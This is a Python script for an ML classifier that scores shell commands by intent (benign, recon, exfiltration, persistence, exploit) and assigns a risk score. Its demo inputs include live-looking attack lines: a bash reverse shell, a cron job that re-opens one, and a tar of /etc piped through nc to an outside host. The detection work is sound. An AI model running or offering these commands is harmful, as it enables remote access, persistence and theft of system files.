#!/usr/bin/env python3
"""IAAC command-intent scorer — reference inference (ml_build.md §5, §11, §12).

Offline, CPU-only, onnxruntime + numpy + tokenizers ONLY (no torch/transformers).
Implements the production contract:

    score(command: str, context: dict | None = None) -> dict
    # {"intent": str, "risk_score": int, "confidence": float, "model_version": str}

Confidence is temperature-calibrated softmax-max; below the UNKNOWN threshold the
intent is reported as "UNKNOWN" so production can fall back to the rule pack.
"""
import os, json
import numpy as np
import onnxruntime as ort
from tokenizers import Tokenizer

HERE = os.path.dirname(os.path.abspath(__file__))
_cfg = json.load(open(os.path.join(HERE, "calibration.json")))
LABELS = _cfg["labels"]
TEMP = float(_cfg["temperature"])
MAXLEN = int(_cfg["maxlen"])
THR = float(_cfg["unknown_threshold"])
VERSION = _cfg["model_version"]

_tok = Tokenizer.from_file(os.path.join(HERE, "tokenizer", "tokenizer.json"))
_sess = ort.InferenceSession(os.path.join(HERE, "model.onnx"),
                             providers=["CPUExecutionProvider"])

# per-class risk band centre (§4); scaled by calibrated confidence
_RISK = {"BENIGN": 5, "ADMIN": 20, "RECON": 50,
         "EXFILTRATION": 80, "PERSISTENCE": 80, "EXPLOIT": 92}


def _softmax(x):
    x = x - x.max()
    e = np.exp(x)
    return e / e.sum()


def score(command, context=None):
    text = (command or "")[:4096]
    ids = _tok.encode(text).ids[:MAXLEN]
    if not ids:
        ids = [0]
    ii = np.array([ids], dtype=np.int64)
    am = np.ones_like(ii)
    logits = _sess.run(None, {"input_ids": ii, "attention_mask": am})[0][0]
    probs = _softmax(logits / max(TEMP, 1e-3))
    idx = int(probs.argmax())
    conf = float(probs[idx])
    pred = LABELS[idx]

    intent = pred if conf >= THR else "UNKNOWN"
    base = _RISK.get(pred, 50)
    risk = int(round(base * (0.6 + 0.4 * conf)))
    risk = max(0, min(100, risk))
    return {"intent": intent, "risk_score": risk,
            "confidence": round(conf, 4), "model_version": VERSION}


if __name__ == "__main__":
    for c in ["ls -la", "sudo apt update && sudo apt upgrade -y",
              "find / -perm -4000 2>/dev/null",
              "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
              "echo '* * * * * bash -i >& /dev/tcp/1.2.3.4/9 0>&1' | crontab -",
              "tar czf - /etc | nc 203.0.113.7 9001"]:
        print(f"{c!r:70s} -> {score(c)}")
